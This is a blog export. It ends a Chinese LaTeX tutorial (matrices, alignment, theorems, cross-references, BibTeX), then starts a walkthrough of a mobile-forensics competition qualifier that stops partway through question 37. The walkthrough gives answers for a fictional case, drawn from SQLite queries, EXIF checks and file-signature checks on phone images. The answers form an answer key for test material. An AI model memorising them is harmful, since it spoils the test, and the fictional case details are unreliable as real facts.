\\Theta ι \\iota Ι \\Iota（很少用） κ \\kappa Κ \\Kappa（很少用） λ \\lambda Λ \\Lambda μ \\mu Μ \\Mu（很少用） ν \\nu Ν \\Nu（很少用） ξ \\xi Ξ \\Xi ο o Ο \\Omicron（很少用） π \\pi Π \\Pi ρ \\rho Ρ \\Rho（很少用） σ \\sigma Σ \\Sigma τ \\tau Τ \\Tau（很少用） υ \\upsilon Υ \\Upsilon φ \\phi Φ \\Phi χ \\chi Χ \\Chi（很少用） ψ \\psi Ψ \\Psi ω \\omega Ω \\Omega 关系符 功能 命令 渲染效果 小于等于 \\leq $\\leq$ 大于等于 \\geq $\\geq$ 不等于 \\neq $\\neq$ 近似 \\approx $\\approx$ 恒等 \\equiv $\\equiv$ 相似 \\sim $\\sim$ 成比例 \\propto $\\propto$ 小于 \u0026lt; $\u0026lt;$ 大于 \u0026gt; $\u0026gt;$ 竖线（用于概率、集合等） \\mid $\\mid$ 逻辑符号 功能 命令 渲染效果 全称量词 \\forall $\\forall$ 存在量词 \\exists $\\exists$ 逻辑与集合符号 符号 命令 渲染效果 空集 \\emptyset $\\emptyset$ 集合元素 \\in $\\in$ 非集合元素 \\notin $\\notin$ 并集 \\cup $\\cup$ 交集 \\cap $\\cap$ 子集 \\subset $\\subset$ 真子集 \\subsetneq $\\subsetneq$ 括号 功能 命令 说明 固定大小 ( ), [ ], \\{ \\} 尺寸固定，不会随内容变化。输入 {} 需用 \\ 转义 自动缩放 \\left(...\\right) 根据内容自动调整大小，必须成对使用 方括号缩放 \\left[...\\right] 自动缩放方括号 大括号缩放 \\left\\{...\\right\\} 自动缩放大括号 尖括号 \\langle ... \\rangle 常用于内积 双竖线符号 \\Vert 双竖线，常用于范数或矩阵行列式 矩阵 在LaTeX中排版矩阵是一项核心功能，amsmath宏包为此提供了一系列功能强大且使用便捷的环境\n这些环境可以自动处理元素的对齐和外层括号的样式\n无论使用哪种矩阵环境，内部语法都是统一的：\n使用\u0026amp;分隔列，即分隔同一行中的元素 使用\\\\来结束当前行，并开始新的一行 和表格很像吧\n矩阵环境 amsmath提供了多种矩阵环境，它们唯一的区别在于最终呈现时外层使用的括号（分隔符）不同\n环境名称 外层括号 常见用途 pmatrix ( ) (圆括号) 用于表示标准的矩阵 bmatrix [ ] (方括号) 同样用于标准矩阵，在一些文献中更常见，也常用于增广矩阵 vmatrix ` Vmatrix ‖ ‖ (双竖线） 专门用于表示矩阵或向量的范数 matrix (无括号) 只排列元素，不添加外层括号\n当你需要使用特殊的括号（如{ }）或根本不需要括号时使用 smallmatrix (无括号) 用于在行内创建小型矩阵\n例如$A = \\begin{smallmatrix} 1 \u0026amp; 0 \\ 0 \u0026amp; 1 \\end{smallmatrix}$ 矩阵中的省略号 命令 方向 用途 \\cdots 水平 (Horizontal) 用于省略行中的元素 \\vdots 垂直 (Vertical) 用于省略列中的元素 \\ddots 对角 (Diagonal) 用于省略对角线上的元素 示例 \\documentclass{ctexart} \\usepackage{amsmath} \\begin{document} \\section{矩阵示例} 一个 3x3 的矩阵 A 可以用 \\texttt{pmatrix} 表示： \\[ A = \\begin{pmatrix} 1 \u0026amp; 2 \u0026amp; 3 \\\\ 4 \u0026amp; 5 \u0026amp; 6 \\\\ 7 \u0026amp; 8 \u0026amp; 9 \\end{pmatrix} \\] 一个 2x2 的行列式可以用 \\texttt{vmatrix} 表示： \\[ \\det(B) = \\begin{vmatrix} x \u0026amp; y \\\\ z \u0026amp; w \\end{vmatrix} \\] 一个 n 阶的单位矩阵 $I_n$ 可以用 \\texttt{bmatrix} 和省略号清晰地表示： \\[ I_n = \\begin{bmatrix} 1 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \\\\ 0 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 0 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 1 \\end{bmatrix} \\] \\end{document} 编译结果：\n矩阵 A:\n\\begin{pmatrix}和\\end{pmatrix} 创建了一个外层为圆括号的矩阵环境 1 \u0026amp; 2 \u0026amp; 3 \\\\定义了矩阵的第一行：1，2，3三个元素由\u0026amp;分隔，\\\\表示此行结束。后续行同理 行列式 det(B):\n\\begin{vmatrix}和\\end{vmatrix}创建了一个外层为单竖线的环境，这正是行列式的标准数学符号 单位矩阵 I_n:\n\\begin{bmatrix}和\\end{bmatrix}创建了一个外层为方括号的环境 \\cdots被用来表示第一行和第二行中间被省略的0 \\vdots被用来表示各列中间被省略的0 \\ddots巧妙地表示了从左上到右下的对角线上被省略的1 通过这些省略号命令的组合，我们能够清晰地表达任意大小的通用矩阵 多行公式对齐 对于较长的公式推导或一组需要对齐的方程，必须将其拆分为多行以保证清晰可读\namsmath宏包为此提供了多种功能强大的环境，核心控制语法是：\n使用\u0026amp;标记对齐点 使用\\\\换行 哦，还是表格的用法\n环境详解 不同的环境主要区别在于编号方式和对齐能力。\n环境名称 编号方式 核心特点与用途 aligned 整体一个编号 本身不产生编号，提供对齐功能\n必须嵌套在其他数学环境（如equation, \\[...\\]）中使用 split 整体一个编号 和aligned几乎相同，但长公式换行时编号的位置在公式中间\n必须嵌套在其他数学环境（如equation, \\[...\\]）中使用 gather 每行独立编号 用于将一组不需要对齐的公式堆叠在一起\n每行都会居中并获得一个独立的编号 align 每行独立编号，\n可灵活对齐 允许像写一个两列的表格一样对齐公式（在\u0026amp;处对齐）\n每行默认都会获得一个编号 align* 完全无编号 是align的无编号版本，功能完全相同，但所有行都不会产生编号 控制编号 在align / gather等逐行编号的环境中，如果不希望某一行显示编号，可以在该行的\\\\之前使用以下命令:\n\\notag\n\\nonumber\n示例1：aligned环境 \\documentclass{ctexart} \\usepackage{amsmath} \\begin{document} \\section{公式推导} 二次展开式的推导过程如下： \\begin{equation} \\label{eq:expand} \\begin{aligned} (a+b)^2 \u0026amp;= (a+b)(a+b) \\\\ \u0026amp;= a^2 + ab + ba + b^2 \\\\ \u0026amp;= a^2 + 2ab + b^2 \\end{aligned} \\end{equation} 整个过程由公式 \\eqref{eq:expand} 概括 \\end{document} 编译结果：\n\\begin{equation}\n最外层是equation环境，意味着内部的所有内容，无论有多少行，都将作为一个整体，共享一个编号\n\\begin{aligned}\n内部的aligned环境是实际负责对齐工作的\n\u0026amp;=\n每一行的=前面都放置了对齐符\u0026amp;，使得三行公式的等号在垂直方向上对齐（实际是\u0026amp;被对齐了）\n\\\\\n在第一行和第二行的末尾用于换行\n示例2：align环境 \\documentclass{ctexart} \\usepackage{amsmath} \\begin{document} \\section{方程组} 我们有如下一组基本方程： \\begin{align} a_1 x + b_1 y \u0026amp;= c_1 \\label{eq:line1} \\\\ a_2 x + b_2 y \u0026amp;= c_2 \\notag \\\\ E \u0026amp;= mc^2 \\label{eq:emc2} \\end{align} 其中，方程 \\eqref{eq:line1} 和 \\eqref{eq:emc2} 是最重要的 \\end{document} 编译结果：\n\\begin{align}\n这个环境会默认给每一行分配一个编号\n\u0026amp;=\n\u0026amp;同样被放在=前面，使得三行公式的等号对齐\n\\label{eq:line1}\n我们可以在任意行后面添加\\label以引用这行的编号，而不是在整个环境中\n\\notag\n在第二行的\\\\前，我们加入了\\notag命令，阻止LaTeX为这一行生成编号\n学术写作 定理类环境 在数理、计算机等学科的写作中，需要频繁使用“定理”、“引理”、“定义”等结构化论述\namsthm 宏包为此提供了标准化的解决方案。\n定义新环境：\\newtheorem 在使用定理环境前，必须先在导言区用\\newtheorem命令进行定义它\n\\newtheorem{新环境名}[共享环境名]{显示标题}[编号层级] 常用用法：\n语法 说明 \\newtheorem{环境名}{显示标题} 定义一个全新的、独立编号的环境 \\newtheorem{环境名}{显示标题}[编号层级] 使该环境的编号与某个层级关联\n最常用的是[section]，表示编号为[章节号].[定理号]，且每章重新从1开始 \\newtheorem{新环境名}[共享环境名]{显示标题} 使新环境与某个已定义的环境共享同一个编号序列 在正文中使用 用法 说明 \\begin{环境名} ... \\end{环境名} 开始一个标准的定理环境 \\begin{环境名}[自定义标题] ... \\end{环境名} 在方括号中添加的标题，会显示在编号后的括号里 \\begin{proof} ... \\end{proof} amsthm 提供的标准证明环境\n会自动以证明.开头，并以一个 Q.E.D. 方块□结尾 示例 \\documentclass{ctexart} \\usepackage{amsthm} \\newtheorem{theorem}{定理}[section] % 定理环境，编号与 section 关联 \\newtheorem{lemma}[theorem]{引理} % 引理环境，与 theorem 共享编号 \\newtheorem{corollary}[theorem]{推论} % 推论环境，与 theorem 共享编号 \\newtheorem{definition}{定义} % 定义环境，独立编号 \\begin{document} \\section{主要结果} 我们首先给出一个关键定义： \\begin{definition} 这个定义很关键 \\end{definition} 然后是本节的核心定理： \\begin{theorem}[勾股定理] \\label{thm:pythagoras} 在一个直角三角形中，两条直角边的平方和等于斜边的平方 \\end{theorem} \\begin{proof} 证明过程略 \\end{proof} 基于定理 \\ref{thm:pythagoras}，我们有一个直接的引理 \\begin{lemma} 这是一个直接的引理 \\end{lemma} 我们还有一个推论： \\begin{corollary} 这是一个推论 \\end{corollary} \\end{document} 定义解释:\n\\newtheorem{theorem}{定理}[section]\n创建了theorem环境，显示为“定理”，编号格式为 [章节号].[定理号] (如 1.1, 1.2 \u0026hellip;)\n\\newtheorem{lemma}[theorem]{引理} \u0026amp; \\newtheorem{corollary}[theorem]{推论}\n创建了lemma和corollary环境，它们和theorem使用同一个计数器\n\\newtheorem{definition}{定义}\n创建了 definition 环境，它自己独立编号 (如 1, 2, 3 \u0026hellip;)\n使用解释:\n第一个definition显示为 “定义 1” theorem环境因为有[勾股定理]，所以显示为 “定理 1.1 (勾股定理)” proof环境自动添加了 “证明.” 和结尾的□符号 由于lemma、corollary与theorem共享编号，所以接下来的lemma显示为 “引理 1.2”，corollary显示为“推论1.3” 交叉引用 在LaTeX的手稿修改过程中，章节和图表的编号随时可能变化，要是让我们手动更新这些编号，等死就可以了\n好在LaTeX的交叉引用机制就很好解决了这个问题，我们之前也有提到过\n其原理是：\n为想要引用的、带编号的元素（章节、图片、表格、公式等）设置一个独一无二的标签(\\label) 在需要引用的地方，通过这个标签来提取它对应的编号 (\\ref) 或页码 (\\pageref) 核心命令 命令 作用与说明 \\label{标签名} 在一个带编号的元素后面设置一个看不见的标记\n标签名在文档中必须是唯一的 \\ref{标签名} 在文本中插入该标签对应的元素编号\n例如，如果\\label{fig:flow}跟着图2的标题，那么\\ref{fig:flow}就会显示为2 \\eqref{标签名} amsmath宏包提供的\\ref变体，专用于引用公式\n它会自动在编号两侧加上括号，例如(2) \\pageref{标签名} 在文本中插入该标签所在的页码 推荐的标签规范 为了避免标签名混乱和冲突，强烈推荐使用带前缀的命名方式：\n元素类型 推荐前缀 示例 章 (Chapter) ch: \\label{ch:background} 节 (Section) sec: \\label{sec:methodology} 图片 (Figure) fig: \\label{fig:results_chart} 表格 (Table) tab: \\label{tab:comparison} 公式 (Equation) eq: \\label{eq:main_theorem} 定理 (Theorem) thm: \\label{thm:pythagoras} 示例 \\documentclass{ctexart} \\usepackage{amsmath} \\usepackage{graphicx} \\begin{document} \\section{随便写写} \\label{sec:intro} 本文介绍一下交叉引用 \\begin{equation} E = mc^2 \\label{eq:emc} \\end{equation} \\section{方法} 在章节 \\ref{sec:intro} 中，我们已经提出了核心思想。图 \\ref{fig:placeholder} +1=2 公式 \\eqref{eq:emc}它位于第 \\pageref{eq:emc} 页。 \\begin{figure}[h] \\centering \\includegraphics[width=0.4\\textwidth]{2.png} \\caption{老图} \\label{fig:placeholder} \\end{figure} \\end{document} 编译结果：\n定义标签:\n在\\section{引言}后面，我们用\\label{sec:intro}将其标记 在equation环境中，我们用\\label{eq:emc}标记了公式 在figure环境的\\caption之后，我们用\\label{fig:placeholder}标记了图片 引用标签:\n章节 \\ref{sec:intro}在编译后会显示为 “章节 1” 图 \\ref{fig:placeholder}会显示为 “图 1” 公式 \\eqref{eq:emc}会显示为 “公式 (1)” 第 \\pageref{eq:emc} 页会显示为 “第 1 页” 如果我们在“随便写写”前再增加一个新的章节，那么原“随便写写”的编号会自动变为 2，而代码中所有 \\ref{sec:intro}的地方，输出也会自动更新为2，无需任何手动修改\n参考文献 BibTeX是LaTeX的标准参考文献管理系统，它将文献数据与排版样式彻底分离，实现了参考文献的完全自动化\n工作流程：\n创建一个.bib数据库文件，存放所有文献信息 在.tex文档的正文中，用\\cite{}命令引用文献 在.tex文档中指定引用的样式和.bib文件的位置 LaTeX编译器会自动完成文献的排序、格式化和列表生成 工作流程详解 创建.bib数据库文件 在Overleaf左侧文件栏，点击New File新建文件，命名为.bib后缀\n这是一个纯文本文件，用于存储文献条目\n添加文献条目 我们可以从Google Scholar、知网或各种学术数据库中直接导出BibTeX格式的条目，然后粘贴到.bib文件中\n这部分通常不用我们自己写，做个了解就行\n条目格式：\n@类型{引用密钥, 字段 = {值}, ... } 常用类型 说明 常用字段 说明 @article 期刊文章 author，title，year 作者, 标题, 年份 @book 书籍 journal，volume，pages 期刊名, 卷, 页码 @inproceedings 会议论文集中的一篇 publisher，address 出版社, 地址 @phdthesis 博士论文 doi，url 数字对象标识符, 网址 示例：\n@article{einstein1905, author = {Albert Einstein}, title = {Zur Elektrodynamik bewegter Körper}, journal = {Annalen der Physik}, year = {1905}, volume = {322}, pages = {891--921}, } 这里的einstein1905就是这篇文献独一无二的引用密钥\n在主文档中设置并引用 命令 作用 放置位置 \\bibliographystyle{样式} 设置参考文献的格式\n常用样式有：\nplain (按字母排序)\nunsrt (按引用顺序)\nalpha (作者+年份)\nabbrv (缩写) 文档末尾，\\bibliography之前 \\cite{引用密钥} 在正文中引用一篇或多篇文献 正文任意位置 \\bibliography{文件名} 指定.bib文件的位置，并在此处生成参考文献列表\n注意，文件名不用带.bib后缀 文档末尾，\\end{document}之前 示例 main.tex 文件:\n\\documentclass{ctexart} \\begin{document} \\section{引言} 引用文献1：\\cite{张健2008精确的程序静态分析} 引用文献2：\\cite{何伟渔1994语法的静态分析和动态分析} \\bibliographystyle{plain} \\bibliography{text} \\end{document} references.bib 文件:\n@phdthesis{张健2008精确的程序静态分析, title={精确的程序静态分析}, author={张健 and others}, year={2008} } @article{何伟渔1994语法的静态分析和动态分析, title={语法的静态分析和动态分析}, author={何伟渔}, journal={上海师范大学学报: 哲学社会科学版}, number={3}, pages={100--106}, year={1994} } 编译结果：\n在正文中，\\cite{何伟渔1994语法的静态分析和动态分析} 和 \\cite{张健2008精确的程序静态分析}会被LaTeX替换为[1]和[2]，因为plain样式是按作者字母排序的，这里我直接使用.bib文件的顺序，就是反着的\n\\bibliography{references}命令会扫描全文，发现只有这两篇文献被引用了\nLaTeX会自动读取references.bib文件中这两篇文献的数据，并根据plain样式，在文末生成一个格式化、排序好的参考文献列表，标题都不用写\n和所有语言一样，只会语法是远远不够的，一定得多上手编排一些文章进行练习，积累经验！\n下面是一些LaTeX练习网站，感兴趣可以看看：\nTEXnique ：互动式LaTeX编程游戏，需要在限定时间内用LaTeX代码实现它给出的公式\nLaTeX.org练习与解答 ：LaTeX.org的论坛中有用户分享的练习题和解答，内容涉及数学公式、文档结构等方面\n","date":"2025-08-19T21:20:24+08:00","image":"http://picture.928330.xyz/typora/LaTeX_logo.svg.jpg","permalink":"https://blog.928330.xyz/p/latex%E4%B8%8D%E5%A4%AA%E7%B2%BE%E9%80%9A%E7%9A%84%E6%95%99%E7%A8%8B/","title":"LaTeX：不太精通的教程"},{"content":"最诡异的一集，资格赛恐怖如斯\n过程中要数次用到数据库，最好可以使用navicat\n检材分卷压缩，一共九卷，解压之后使用Veracrypt挂载就能得到题目\n王晓琳手机(1-14) 1.王晓琳手机的IMEI号是什么?(以阿拉伯数字回答) 352978115584444 2.王晓琳的手机安装了什么即时通讯软件(lnstant Messaging Apps)? A. Signal\nB. 微信(WeChat)\nC. QQ\nD. WhatsApp\nE. LINE\n在应用列表看到了微信和WhatsApp，说明这一题是多选啊\n在基本信息 -\u0026gt; 应用列表里面过滤应用分类为\u0026quot;即时通信\u0026quot;，又发现一个没有显示的Signal：\nABD 回过头再来看，其实火眼分析的也不一定准确，我觉得最好的方式是所有的都看一遍，不过真有那么多时间吗？嗯。存疑\n3.王晓琳于什么日子和时间曾经通过即时通讯软件发出一个PDF档案?(以时区UTC+8回答) A.2022-09-30 17:39:53\nB.2022-10-01 17:39:53\nC.2022-09-30 18:30:28\nD.2022-10-01 16:30:22\n在WhatsApp的文件传输记录里找到一个名为staff A team.pdf：\nA 4.承上题，这个 PDF 档案的MD5哈希值(Hash Value) 是什么?(以大写英文及阿拉伯数字回答) 这个文件在挂载中好像改了名，变成了内部编号，所以我们在文件里面搜索不到\n不过直接在上题的聊天记录里面点击，就能在本地文件管理器找到挂载的这个pdf文件了：\n之后不管是用poweshell，还是在火眼里面计算都可以：\nAE0D6735BBE45B0B8F1AB7838623D9C8 5.王晓琳将这个PDF档案发给哪一个用户,而该用户的手机号码是什么? A.85297663607\nB.85259308538\nC.85269707307\nD.85246427813\n在好友消息里面一个个查找就行：\nB 6.王晓琳发出这个PDF档案的原因是什么? A.寻求协助\nB.分享档案内容\nC.错误发出\nD.无法开启\n看一下聊天记录就知道了：\nD 7.承上题，分析王晓琳与上述用户的对话，他们的关系是什么? A. 客户\nB. 师生\nC. 家人\nD. 同事\n同样是查看聊天记录，有电脑部、返工等等字样，应该是同事：\nD 其实从这里也就能看出，对方就是本案件嫌疑人林俊熙，两人应该是从同事变成恋人，而后分手\n后面的照片也和案件调查的内容对应上了\n8.王晓琳于何时要求上述用户删除一张照片? A. 2022-10-06\nB. 2022-09-28\nC. 2022-09-30\nD. 2022-10-03\n依旧聊天记录：\nD 9.承上题，该用户向王晓琳提出什么要求以删除这张照片? A. 金钱\nB. 毒品\nC. 性服务\nD. 加密货币\n同上题图，“比钱我就删除”，就是要钱\nA 10.王晓琳的手机里有什么电子书籍(Electronic Book) ? A. 三国演义\nB. 红楼梦\nC. 水浒传\nD. 西游记\n首先的思路就是去找有没有相关的app，但是现在支持详细分析的似乎没有一个是电子书阅读平台\n所以接下来就是去翻第二题找过的应用列表，但我也不知道哪个是阅读软件，所以要请出伟大的ai大人了\n不知道为什么我不能导出成csv，只能一段段截图喂给ai了：\nai真是太好用了你们知道吗\n但很遗憾，就算我找到了电子阅读书的软件，也不知道在哪找书的数据\n所以换一个思路，直接使用火眼的全局搜索功能把所有选项都找一遍：\n很幸运第一个选项三国演义就找到了：\nD选项当然也是没有的： A 11.王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果(Highlight)? A. 卿有何妙计\nB. 宝玉已是三杯过去了\nC. 武松那日早饭罢\nD. 就除他做个弼马温罢\n不知道怎么找，直接看选项\n选项B是红楼梦，C是水浒传，D应该是西游记，A就应该是三国演义了：\n为了保险我们直接全局搜索AD两项，也是很幸运，A又搜到了：\nA 12.王晓琳的手机里有一个 \u0026lsquo;MTR Mobile \u0026lsquo;(港铁)的手机程序(Mobile App)。检视其数据库(Database) 的数据，王晓琳于2022年10月11日 22:04 时将一行程加入书签(Bookmark)，这段行程的起点及终点站包括? A. 尖沙咀\nB. 红硒\nC. 康城\nD. 青衣\nE. 沙田\n直接在文件系统里面搜索MTR，可以在搜出来的同级目录下找到一个数据库：\n此外在MTRmobile文件夹下也有很多的数据库，不过我们先一个一个试，用SQLite类型连接数据库：\n这里面很多字段和选项一样，可能是找对了\nCREATE_DATE字段\n我们需要搜索2022年10月11日22:04之后的条目，先找个网站转换时间戳：\nhttps://tool.chinaz.com/tools/unixtime.aspx 使用sql语句在表里面查询：\nSELECT * FROM BookmarkNHistory WHERE CREATED_DATE \u0026gt;= 1665497040 ORDER BY CREATED_DATE; 只查询出来一条语句，应该就是目标：\nDE 13.王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片?(以阿拉伯数字回答) 基本信息 -\u0026gt; 图片，把创建时间改成2022-10-2当天：\n每一张最好都看一下，我大致看了，应该都是风景照没错\n90 14.检视王晓琳的手机照片，她于2022年10月2日到过什么地方? A.大潭郊游径\nB.城门畔塘径\nC.大榄麦理浩径\nD.京士柏卫理径\n看来上一题全部看一遍是正确的，我们能找到这样一张图片：\nB 李大辉的Phone(15-24) 15.李大辉使用的是一台LG V10的手机，它的型号是什么? A. LGH960C\nB. LGH961N\nC. LGH960H\nD. LGH961C\nE. LGH961D\nB 16.李大辉的手机最常搜索的类别(Category) 是什么? A. 护肤品\nB. 旅游\nC. 运动\nD. 学校\n查看chrome浏览器的历史记录，发现最多的是关于化妆品一类的：\nA 17.李大辉最近光顾了一家美丰快运公司，这快递件的单号是什么?(不要输入符号及空白，以阿拉伯数字回答) 这题不会\n先是看了一遍图片，没有找到快递相关的东西\n又跑到文件里面找图片，七千多张翻了二十多页，啥也没有，太耗时间了，还给我火眼整的卡卡的\n我想到耗时任务里面有图片文字提取，但是使用要苍穹ai引擎，而且也没有关键词，不一定好找\n接着又在浏览器里面找，还是没有快递相关，遂放弃，呃啊\n*这张图片其实是被删掉了，但在下面路径存有一个缩略图：\nAndroid.bin/分区57/data/com.google.android.apps.photos/cache/glide_cache/\n4567567812344567 18.李大辉收到的电邮中有一个钓鱼链结(Phishing Link)，这个链结的地址是什么? A. 以上皆非\nB. https://bit.ly/3yeARcO C. https://bit.ly/5vM12 D. http://bit.ly/Hell0 在Gmail里面能找到：\nB 19.承上题，这封电邮是从哪个电邮地址寄出的? A. 以上皆非\nB. Cavinchow456@yahoo.com C. 2020ChanChan@hotmail.com D. 30624700Peter@proton.me 同上题图\nD 20.承上题，寄出这封电邮的IP地址是?\u003c?\u003e A. 以上皆非\nB. 65.54.185.39\nC. 10.13.105.56\nD. 58.152.110.218\n这题我也不知道怎么做，查看了Gmail的\n嗯，不过10开头的是内网地址，不能在公网上路由？但那也只能排除C\n21.李大辉手机有一个order.xlsx 的档案被加密了，解密钥匙是什么? A. 2022 Nov!\nB. 20221101\nC. Nov2022!\nD. P@sswOrd!\n这一题答案在图片中，或许应该庆幸十七题我把所有图片都看了一遍：\nC 不过这个选择题就四个选项，找到加密文件全部试一遍也试出来了，有点意义不明\n22.香港的街道上每一枝街灯都有编号。分析李大辉手机里的程序 \u0026lsquo;KMB 1933\u0026rsquo;， 哪一枝街灯在经度 (Latitude) 22.4160270000， 纬度 (Longitude) 114.2139450000 附近，它的编号是什么?(以大㝍英文及阿拉伯数字回答) 和十二题一样，搜索KMB，在文件目录下找到数据库：\n链接之后，找到kmb_routestopfile_ST表，只有这个表里面有经纬度：\nsql进行模糊查询：\nSELECT * FROM kmb_routestopfile_ST WHERE lat BETWEEN 22.416027 - 0.0005 AND 22.416027 + 0.0005 AND lng BETWEEN 114.213945 - 0.0005 AND 114.213945 + 0.0005 ORDER BY ABS(lat - 22.416027) + ABS(lng - 114.213945) LIMIT 10; CE1453 23.李大辉的手机里有一张由该手机拍的照片，照片的元资料(Metadata) 曾被修改，这张照片的档案名是什么?(以大写英文及数字回答，不用回答副档名 在Android.bin/分区57/media/0/DCIM/Camera路径下查看手机照片的创建时间和修改时间\n发现只有一张图片的c和m时间不一样： 20220922_152622.jpg 24.分析李大辉的手机里的资料，他在哪一间公司工作? A. 美丽好化妆品公司\nB. 步步高贸易公司\nC. 盛大国际有限公司\nD. 永恒化妆品公司\n微信和whatsapp都没有相关工作消息，最后在文件的pdf中找到了职员证：\nA 林浚熙的iphone(25-38) 25.林浚熙曾经以手机登录Google账户的验证码是什么?(不要输入符号，以大写英文及阿拉伯数字回答) 翻阅短信：\nG-785186 26.林浚熙手机的\u0026rsquo; WhatsApp\u0026rsquo; 号码是什么?(号码)@s.whatsapp.net? (以阿拉伯数字回答) 85259308538 27.通过分析林浚熙手机的照片，判断他在何处偷拍王晓琳? A. 交通工具\nB. 郊野公园\nC. 游泳池\nD. 酒店房间\n照片在之前王晓琳的聊天记录里面已经看到过，是酒店\nD 28.林浚熙曾经删掉自己拍摄的照片，这张照片的档案名(Filename) 是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG) IMG_0444.JPG 29.王晓琳曾经发送一个PDF档案予林浚熙，这个档案的文件签名(File Signature) 是什么?(以十六进制数字答首八位数值，如FOA1C5E1) 在本地资源管理器找到这个pdf，随便一个十六进制编辑器打开： D0CF11E0 30.承上题，该PDF档案内包含一位曾经被肩的受害者资料。分析林熙手机的数据，这位受害者的英文名字是什么?(不要输入符号及空白，以大写英文回答) 尝试直接打开失败，说不是pdf格式：\n哎呀，这才反应过来不是PDF文件，开头特征是office应用的，但是不知道是哪一种\n我们拖到linux里面使用file命令测试一下（截图太长就不放了）：\n┌──(kali㉿kali)-[~] └─$ file 111.pdf 111.pdf: Composite Document File V2 Document, Little Endian, Os: MacOS, Version 6.12, Code page: 10000, Author: user30, Last Saved By: user30, Name of Creating Application: Microsoft Macintosh Excel, Create Time/Date: Wed Sep 28 12:06:13 2022, Last Saved Time/Date: Fri Sep 30 10:37:41 2022, Security: 0 输出里面的Composite Document File V2 Document表明这是 OLE 容器格式，而Microsoft Macintosh Excel说明是Excel生成的OLE文档，也就是.xls文件\n修改后缀名打开：\n林俊熙的手机好友消息里面只有一个消息与人名有关，在里面就找到了存在于表里面的人：\nWONG SAI PING 31.分析林浚熙手机上的数据，他在2022年10月17日计划去什么地方? A. 以上皆非\nB. 荃湾站\nC. 沙田站\nD. 国际金融中心二期\n在手机上发现了waze软件， 是一款非GPS导航与实时路况应用\n但分析出来的内容里面没有10月17日的行程：\n再去文件里面找一下waze，在ChunHei_iPhone.tar/AppDomain-com.waze.iphone/Documents路径下发现两个数据库，一个个查找，最终在user.db下找到了一个表，里面有时间和地点：\n这两个地点都在选项里面，时间是时间戳类型，都转换一下：\n第二个是17号的数据\nC 32.承上题，上述行程的结束时间是?(如答案为 1:01:59，需回答160159) 同上题图：\n124500 题目给的例子有问题应该\n33.于林浚熙的手机里，在2022年9月1日或以后，哪一张照片是由其他手机拍摄的，而它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) 使用耗时任务的图片exif分析，分析完之后点左上角切换成行视图，再点击右边的设置列，把型号勾选上：\n过滤拍摄时间是2022-9-1之后的图片，发现有四张（实际三张）不是林俊熙的手机iphone XR，而是XS：\n然后做到这里就卡住了，题目说只有一张，但不知道怎么分辨\n34.根据照片的数据库（Photos.sqlite) 资料，哪一个栏目标题(Column Header) 可以显示这张照片的接收方式? A. ZIMPORTEDFROMSOURCEIDENTIFIER\nB. ZIMPORTEDBYBUNDLEIDENTIFIER\nC. ZRECEIVEMETHODIDENTIFIER\nD. ZRECEIVEDFROMIDENTIFIER\nios会把所有照片绑在一起放在Photos.sqlite里面存储，然后标记来源方便查找\n搜索这个数据库：\n连接后查询四个选项哪一个在表里面，sqlite的机制和常见的mysql不一样，没学过，交给ai了：\nSELECT \u0026#39;ZIMPORTEDFROMSOURCEIDENTIFIER\u0026#39; AS column_name, name AS table_name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND sql LIKE \u0026#39;%ZIMPORTEDFROMSOURCEIDENTIFIER%\u0026#39; UNION ALL SELECT \u0026#39;ZIMPORTEDBYBUNDLEIDENTIFIER\u0026#39;, name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND sql LIKE \u0026#39;%ZIMPORTEDBYBUNDLEIDENTIFIER%\u0026#39; UNION ALL SELECT \u0026#39;ZRECEIVEMETHODIDENTIFIER\u0026#39;, name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND sql LIKE \u0026#39;%ZRECEIVEMETHODIDENTIFIER%\u0026#39; UNION ALL SELECT \u0026#39;ZRECEIVEDFROMIDENTIFIER\u0026#39;, name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND sql LIKE \u0026#39;%ZRECEIVEDFROMIDENTIFIER%\u0026#39;; B 35.承上题，这张照片通过什么方式接收? A. 网页下载\nB. 蓝牙传送\nC. 以上皆非\nD. WhatsApp软件传送\nE. Signal软件传送\n上一题我们找到了含有接受方式字段的表格，一共有三张，经过查看发现ZADDITIONALASSETATTRIBUTES才是我们想要找的存储了所有图片的表格，利用sql查询33题找到的四张图片就行了吧：\nSELECT ZORIGINALFILENAME, ZIMPORTEDBYBUNDLEIDENTIFIER FROM ZADDITIONALASSETATTRIBUTES WHERE ZORIGINALFILENAME IN ( \u0026#39;IMG_0420.HEIC\u0026#39;, \u0026#39;IMG_0421.HEIC\u0026#39;, \u0026#39;IMG_0422.HEIC\u0026#39;, \u0026#39;IMG_0446.HEIC\u0026#39; ); 什么？竟然一张都没有找到！难道这几张图片根本就不存在？？？！！！\n再次返回表格，确实没有看见这几张图片，不过比对他们的时间却发现了猫腻：\n在数据库里面，这几张来自其他手机的、以.HEIC作为后缀的图片，似乎被重新命名了，有了另一个名称\n而且，这时也发现前文的IMG_0420.HEIC和IMG_0423.HEIC是同一张图片，不知道为什么存储了两次\n不过这些都不重要，知道了真正的名称，我们改动一下接着查询：\nSELECT ZORIGINALFILENAME, ZIMPORTEDBYBUNDLEIDENTIFIER FROM ZADDITIONALASSETATTRIBUTES WHERE ZORIGINALFILENAME IN ( \u0026#39;IMG_0381.HEIC\u0026#39;, \u0026#39;IMG_0383.HEIC\u0026#39;, \u0026#39;IMG_0730.HEIC\u0026#39; ); 四张图片的来源都是com.apple.sharingd，然后告诉ai大人吧：\n原来是airdrop，这玩意可比选项里面的快多了\nC 36.承上题，这张照片原本的档案名(Original Filename) 是什么?不要输入，以大写英文及阿拉伯数字回答。如 Cat10,jpg，需回答CAT10JPG) 看来上一题得到的名称还是很重要的\nIMG0730HEIC 37.林浚熙手机里有一个备忘录(Notes)被上了锁，这个备忘录的名称是什么?(以大写英文及阿拉数字回答) 